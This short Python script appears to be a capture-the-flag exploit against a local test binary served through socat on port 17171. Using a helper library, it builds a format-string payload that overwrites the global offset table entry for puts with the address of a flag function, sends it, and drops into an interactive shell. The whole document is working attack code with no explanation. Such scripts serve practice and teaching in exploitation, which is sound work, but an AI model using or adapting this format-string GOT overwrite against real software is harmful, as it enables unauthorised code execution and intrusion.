from No___Op import *

#socat TCP-LISTEN:17171,reuseaddr,fork EXEC:./test

target = "localhost:17171"

got_puts = 0x804a018
addr_flag = 0x0804852b

tube = Pwning( target )

fsb = FSB(7) #7 is offset
fsb.rewrite(got_puts, addr_flag)

tube.sendline(fsb.get())
tube.shell()
